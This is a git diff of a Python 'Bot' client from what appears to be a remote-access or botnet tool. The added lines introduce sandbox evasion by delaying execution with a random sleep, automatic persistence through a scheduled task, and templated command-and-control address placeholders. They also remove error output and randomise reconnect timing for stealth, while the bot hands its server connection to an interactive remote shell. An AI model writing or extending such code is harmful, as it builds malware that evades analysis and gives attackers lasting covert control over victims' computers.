@@ -3,42 +3,35 @@
 # Description: Bot 
 
 import ssl
-import json
 import socket
 import pickle
 from time import sleep 
+from random import randint 
 from lib import shell, session
 from os import getcwd, path, chdir
 
+# wait, we might be in a sandbox.
+sleep(randint(16, wait_time))
+
+# auto persist 
+AUTO_PERSIST = auto_persist
+
+if AUTO_PERSIST:
+ shell.Shell(None, None, None).create_task(None)
+
 # address
-IP = '127.0.0.1'
-PORT = '8080'
-
-# cert path
-config = {
-  'cert_path': 'public.crt'
-}
-
-config_file = 'config.json'
-
-if not path.exists(config_file):
- with open(config_file, 'wt') as f:
-  json.dump(config, f)
+IP = addr_ip 
+PORT = addr_port 
 
 class Bot(object):
  
  def __init__(self, home):
-  self.cert = self.cert_path 
+  self.cert = 'public.crt'
+  self.shell = None
   self.home = home
   self.conn = None 
   self.port = None 
   self.ip = None
-
- @property 
- def cert_path(self):
-  if path.exists(config_file):
-   with open(config_file, 'rt') as f:
-    return json.load(f)['cert_path']
 
  def shutdown(self):
   try:
@@ -57,9 +50,9 @@ class Bot(object):
    self.ip, self.port, self.is_active = None, None, False
    self.display_text('Error: Server is unavailable, trying again in a bit')
   else:
-   _shell = shell.Shell(s, services['args'], self.home)
+   self.shell = shell.Shell(s, services['args'], self.home)
    self.is_active = True
-   _shell.shell()
+   self.shell.shell()
 
  def get_cert(self):
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -87,7 +80,6 @@ class Bot(object):
     sleep(1.5)
     self.connect()
   except Exception as e:
-   print('bot(1) Error: {}'.format(e))
    self.shutdown()
 
 if  __name__ == '__main__':
@@ -95,8 +87,12 @@ if  __name__ == '__main__':
  while True:
   chdir(home)
   bot = Bot(home)
-  bot.contact_server(IP, int(PORT))
+  bot.contact_server(IP, PORT)
   bot.shutdown()
-  try:sleep(10)
+
+  if bot.shell:
+   if bot.shell.disconnected:
+    break 
+  try:sleep(randint(30, 60))
   except:break
   del bot 
